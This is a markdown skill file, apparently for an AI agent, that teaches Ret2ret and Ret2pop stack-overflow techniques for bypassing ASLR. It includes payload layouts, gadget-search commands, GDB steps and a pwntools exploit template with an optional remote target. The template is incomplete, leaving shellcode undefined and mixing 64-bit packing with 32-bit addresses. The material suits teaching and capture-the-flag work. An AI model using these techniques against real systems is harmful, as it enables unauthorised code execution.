---
name: ret2ret-exploitation
description: How to bypass ASLR using Ret2ret and Ret2pop techniques. Use this skill whenever the user mentions ASLR bypass, stack pointer manipulation, ret2ret, ret2pop, or needs help crafting exploits that leverage existing stack pointers to defeat address randomization. Make sure to use this skill when working on binary exploitation challenges involving stack overflows with ASLR enabled, or when the user needs to understand how to abuse existing stack pointers for control flow hijacking.
---

# Ret2ret & Ret2pop Exploitation

This skill teaches you how to bypass ASLR (Address Space Layout Randomization) by abusing existing pointers in the stack through Ret2ret and Ret2pop techniques.

## Core Concepts

### What is Ret2ret?

Ret2ret is a technique to **bypass ASLR by abusing an existing pointer in the stack**.

**Key insight:** Stack overflows are usually caused by strings, and strings end with a null byte (`0x00`) at the end in memory. This allows you to modify the lowest byte of an existing stack pointer.

**Example:** If the stack contained `0xbfffffdd`, a string overflow could transform it into `0xbfffff00` (the last byte becomes zeroed).

If that modified address points to your shellcode in the stack, you can make execution flow reach that address by **chaining `ret` instructions** until the modified pointer is reached.

### What is Ret2pop?

Ret2pop is a variant used when you find a **perfect pointer in the stack that you don't want to modify**.

**Key difference:** Instead of modifying the pointer with `0x00`, you:
1. Shorten the RET sled by 1 address
2. Make the last address of the RET sled point to `pop <reg>; ret`
3. The `pop` instruction removes the data affected by the `0x00` from the stack
4. The final `ret` points to the perfect address without any change

## Attack Methodology

### Ret2ret Attack Structure

```
[Stack Layout]
├── NOP sled
├── Shellcode
├── Overwrite EIP with RET sled (addresses to `ret` instruction)
└── 0x00 byte modifies existing stack pointer → points to NOP sled
```

**Step-by-step:**

1. **Find a suitable stack pointer** - Look for an existing pointer in the stack that, when its lowest byte is zeroed, points to a useful location (your shellcode/NOP sled)

2. **Craft the payload:**
   - NOP sled (for landing zone)
   - Shellcode
   - RET sled: chain of addresses pointing to `ret` instructions
   - The string's null terminator will modify the target pointer

3. **Calculate RET sled length** - Count how many `ret` instructions you need to reach the modified pointer

4. **Test and iterate** - Use GDB to verify the pointer modification and control flow

### Ret2pop Attack Structure

```
[Stack Layout]
├── NOP sled
├── Shellcode
├── RET sled (shortened by 1)
├── pop <reg>; ret instruction
└── 0x00 byte overwrites data before perfect pointer
```

**Step-by-step:**

1. **Find a perfect pointer** - An existing stack pointer that already points to useful code/data

2. **Craft the payload:**
   - NOP sled
   - Shellcode
   - RET sled (one address shorter than ret2ret)
   - Last address: `pop <reg>; ret` gadget
   - The null byte overwrites data before the perfect pointer

3. **The pop instruction** removes the corrupted data, leaving the perfect pointer intact

4. **Final ret** jumps to the unmodified perfect pointer

## Practical Implementation

### Finding RET Gadgets

```bash
# Find ret instructions in the binary
ROPgadget --binary ./vulnerable_binary | grep "ret"

# Or use objdump
objdump -d ./vulnerable_binary | grep "^\s*[0-9a-f]*:\s*\s*c3"
```

### Finding Pop+Ret Gadgets (for Ret2pop)

```bash
# Find pop reg; ret gadgets
ROPgadget --binary ./vulnerable_binary | grep "pop.*ret"

# Common patterns:
pop eax; ret
pop ebx; ret
pop ecx; ret
pop edx; ret
```

### GDB Debugging Tips

```bash
# Set breakpoint at vulnerable function
gdb ./vulnerable_binary
(gdb) break vulnerable_function

# Run with input
(gdb) run $(python3 -c "print('A'*200 + 'B'*4)")

# Examine stack
(gdb) x/20wx $esp

# Look for useful pointers
(gdb) info registers
(gdb) x/10wx $ebp
```

### Pwntools Template

```python
from pwn import *

# Connect to target
p = process('./vulnerable_binary')
# p = remote('target.com', 1337)

# Find ret gadget
ret_addr = pwn.ROP(p).find_gadget('ret').address

# Find pop gadget (for ret2pop)
pop_ret = pwn.ROP(p).find_gadget('pop eax; ret').address

# Craft payload
payload = b''
payload += b'\x90' * 16  # NOP sled
payload += shellcode
payload += p64(ret_addr) * 10  # RET sled
# For ret2pop, add pop gadget at the end
# payload += p64(pop_ret)

p.sendline(payload)
p.interactive()
```

## Common Patterns

### Pattern 1: Simple Ret2ret

**Scenario:** Stack has pointer `0xbfffffdd`, you want `0xbfffff00`

```
Payload structure:
[padding][NOP sled][shellcode][ret_addr]*N[null terminator]

The null terminator modifies 0xbfffffdd → 0xbfffff00
RET sled chains N rets to reach that pointer
```

### Pattern 2: Ret2pop with Perfect Pointer

**Scenario:** Stack has perfect pointer at offset X, data before it gets corrupted

```
Payload structure:
[padding][NOP sled][shellcode][ret_addr]*(N-1)[pop_eax_ret][null terminator]

The null terminator corrupts data before perfect pointer
pop eax; ret removes that corrupted data
Final ret uses the perfect pointer
```

## Debugging Checklist

- [ ] Verify ASLR is enabled: `cat /proc/sys/kernel/randomize_va_space`
- [ ] Confirm stack pointer exists at expected location
- [ ] Calculate exact offset to target pointer
- [ ] Verify RET sled length matches pointer distance
- [ ] Check for NX/DEP - may need ROP instead of shellcode
- [ ] Verify string null termination behavior
- [ ] Test with GDB before final exploit

## References

- [Original Ret2ret Example](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2ret.c)
- [Ret2ret Exploit](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2retexploit.c)
- [Ret2pop Example](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2pop.c)
- [Ret2pop Exploit](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2popexploit.c)
- [Tilo Mueller's Notes](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md)

## When to Use This Skill

Use this skill when:
- You're working on a binary exploitation challenge with ASLR enabled
- You've identified a stack overflow vulnerability
- You need to bypass address randomization
- You want to understand how to leverage existing stack pointers
- You're analyzing or crafting ret2ret/ret2pop exploits
- You're studying advanced stack-based exploitation techniques
